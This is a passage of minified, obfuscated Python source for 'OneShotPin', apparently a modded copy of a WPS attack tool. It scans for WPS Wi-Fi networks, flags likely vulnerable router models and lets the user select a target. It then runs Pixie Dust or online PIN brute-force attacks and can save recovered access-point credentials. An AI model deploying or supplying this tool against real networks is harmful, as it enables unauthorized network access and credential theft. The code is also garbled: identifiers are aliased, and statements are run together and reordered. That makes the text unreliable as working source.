(\d+)'):u,zf(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'):a,zf(r' [*] AP setup locked: (0x[0-9]+)'):L,zf(r' [*] Model: (.*)'):o,zf(r' [*] Model Number: (.*)'):W,zf(r' [*] Device name: (.*)'):O}for line in lines:if line.startswith('command failed:'):iP('[!] Error:',line)return ig line=line.strip('\t')for regexp,handler in matchers.items():res=zv(regexp,line)if res:handler(line,res,networks)networks=iu(ia(lambda x:iL(x['WPS']),networks))if not networks:return ig networks.sort(key=lambda x:x['Level'],reverse=iv)network_list={(i+1):network for i,network in iB(networks)}def b(s,length,postfix='…'):if iV(s)>length:k=length-iV(postfix)s=s[:k]+postfix return s def S(text,color=iI):if color:if color=='green':text='\033[92m{}\033[00m'.format(text)elif color=='red':text='\033[91m{}\033[00m'.format(text)elif color=='yellow':text='\033[93m{}\033[00m'.format(text)else:return text else:return text return text if self.vuln_list:iP('Network marks: {1} {0} {2} {0} {3}'.format('|',S('Possibly vulnerable',color='green'),S('WPS locked',color='red'),S('Already stored',color='yellow')))iP('Networks list:')iP('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format('#','BSSID','ESSID','Sec.','PWR','WSC device name','WSC model'))network_list_items=iu(network_list.items())if zL:network_list_items=network_list_items[::-1]for n,network in network_list_items:number=f'{n})' model='{} {}'.format(network['Model'],network['Model number'])essid=b(network['ESSID'],25)deviceName=b(network['Device name'],27)line='{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(number,network['BSSID'],essid,network['Security type'],network['Level'],deviceName,model)if(network['BSSID'],network['ESSID'])in self.stored:iP(S(line,color='yellow'))elif network['WPS locked']:iP(S(line,color='red'))elif self.vuln_list and(model in self.vuln_list):iP(S(line,color='green'))else:iP(line)return network_list def Q(self)->ix:networks=self.iw_scanner()if not networks:iP('[-] No WPS networks found.')return while 1:try:networkNo=ic('Select target (press Enter to refresh): ')if networkNo.lower()in('r','0',''):return self.prompt_network()elif iH(networkNo)in networks.keys():return networks[iH(networkNo)]['BSSID']else:raise il except iD:iP('Invalid number')def j(iface,down=ig):if down:action='down' else:action='up' cmd='ip link set {} {}'.format(iface,action)res=zX(cmd,shell=iv,stdout=zq,stderr=zq)if res.returncode==0:return iv else:return Falsedef die(msg):zi.write(msg+'\n')zw(1)def t(): return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by FARHAN %(prog)s <arguments>Required arguments: -i, --interface=<wlan0> : Name of the interface to useOptional arguments: -b, --bssid=<mac> : BSSID of the target AP -p, --pin=<wps pin> : Use the specified pin (arbitrary string or 4/8 digit pin) -K, --pixie-dust : Run Pixie Dust attack -B, --bruteforce : Run online bruteforce attackAdvanced arguments: -d, --delay=<n> : Set the delay between pin attempts [0] -w, --write : Write AP credentials to the file on success -F, --pixie-force : Run Pixiewps with --force option (bruteforce full range) -X, --show-pixie-cmd : Always print Pixiewps command --vuln-list=<filename> : Use custom file with vulnerable devices list ['vulnwsc.txt'] --iface-down : Down network interface when the work is finished -l, --loop : Run in a loop -r, --reverse-scan : Reverse order of networks in the list of networks. Useful on small displays -v, --verbose : Verbose outputExample: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K"""
if __name__=='__main__':import argparse parser=zk(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by FARHAN ',epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')zG('-i','--interface',type=ix,required=iv,help='Name of the interface to use')zG('-b','--bssid',type=ix,help='BSSID of the target AP')zG('-p','--pin',type=ix,help='Use the specified pin (arbitrary string or 4/8 digit pin)')zG('-K','--pixie-dust',action='store_true',help='Run Pixie Dust attack')zG('-F','--pixie-force',action='store_true',help='Run Pixiewps with --force option (bruteforce full range)')zG('-X','--show-pixie-cmd',action='store_true',help='Always print Pixiewps command')zG('-B','--bruteforce',action='store_true',help='Run online bruteforce attack')zG('-d','--delay',type=iG,help='Set the delay between pin attempts')zG('-w','--write',action='store_true',help='Write credentials to the file on success')zG('--iface-down',action='store_true',help='Down network interface when the work is finished')zG('--vuln-list',type=ix,default=zx.dirname(zx.realpath(__file__))+'/vulnwsc.txt',help='Use custom file with vulnerable devices list')zG('-l','--loop',action='store_true',help='Run in a loop')zG('-r','--reverse-scan',action='store_true',help='Reverse order of networks in the list of networks. Useful on small displays')zG('-v','--verbose',action='store_true',help='Verbose output')args=zu()if zd<0x03060F0:die("The program requires Python 3.6 and above")if zF()!=0:die("Run it as root")if not j(zo):die('Unable to up interface "{}"'.format(zo))while iv:try:if not zW:try:with ih(zO,'r',encoding='utf-8')as ie:vuln_list=ie.read().splitlines()except FileNotFoundError:vuln_list=[]scanner=J(zo,vuln_list)if not za:iP('[*] BSSID not specified (--bssid) — scanning for available networks')zW=zJ()if zW:companion=R(zo,zb,print_debug=zS)if zQ:iz(zW,zj,zt)else:iq(zW,zj,zU,zE,zT)if not za:break else:zW=iI except iN:if za:if ic("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower()=='y':iP("Aborting…\nStay With\nWILDEV ")break else:zW=iI else:iP("\nAborting…\nStay With\nWILDEV ")break if zy:j(zo,down=iv)
iq=companion.single_connection
iz=companion.smart_bruteforce
zJ=scanner.prompt_network
zy=args.iface_down
zT=args.pixie_force
zE=args.show_pixie_cmd
zU=args.pixie_dust
zt=args.delay
zj=args.pin
zQ=args.bruteforce
zS=args.verbose
zb=args.write
zO=args.vuln_list
zW=args.bssid
zo=args.interface
zL=args.reverse_scan
za=args.loop
zu=parser.parse_args
zG=parser.add_argument
zk=argparse.ArgumentParser
